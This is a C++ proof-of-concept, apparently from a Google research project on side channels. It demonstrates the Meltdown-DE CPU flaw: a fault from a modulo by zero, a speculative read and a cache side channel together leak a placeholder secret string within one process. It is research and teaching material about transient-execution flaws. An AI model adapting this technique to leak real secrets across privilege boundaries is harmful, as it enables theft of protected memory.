/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

/**
 * Demonstrates the Meltdown-DE on x86/64.
 * We exploit the fact that on all CPUs vulnerable to Meltdown-DE (and known to
 * us) holds that:
 * 2 % 0 = 2
 * Therefore we accomodate the private data to be stored in multiple strings
 * where the secret data is on index 2 (first two indices contain dummy data).
 * Then we speculatively access those unreachable characters in a loop.
 **/

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX
#  error Unsupported OS. Linux required.
#endif

#if !SAFESIDE_IA32 && !SAFESIDE_X64
#  error Unsupported architecture. x86/64 required.
#endif

#include <array>
#include <cstring>
#include <iostream>

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "meltdown_local_content.h"
#include "utils.h"

const char *public_data = "Hello, world!";

constexpr size_t kPrivateDataLength = 16;

// First two characters of each string are always dummy.
const char *private_data[kPrivateDataLength] = {
  "XXI",
  "XXt",
  "XX'",
  "XXs",
  "XX ",
  "XXa",
  "XX ",
  "XXs",
  "XXe",
  "XXc",
  "XXr",
  "XXe",
  "XXt",
  "XX!",
  "XX!",
  "XX!",
};

// We must store zero and one as a global variables to avoid optimizing them
// out.
size_t zero = 0;
size_t two = 2;

static char LeakByte(size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    ForceRead(isolated_oracle.data() + static_cast<size_t>(
        public_data[safe_offset]));

    // This fails with division exception. Whatever is the result of 1 % 0, it
    // cannot be more than 1 and first two characters are dummy in each private
    // string. During the modulo by zero, SIGFPE is raised and the signal
    // handler moves the instruction pointer to the afterspeculation label.
    ForceRead(isolated_oracle.data() + static_cast<size_t>(
        private_data[offset][two % zero]));

    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGFPE signal handler moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  OnSignalMoveRipToAfterspeculation(SIGFPE);
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < kPrivateDataLength; ++i) {
    std::cout << LeakByte(i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
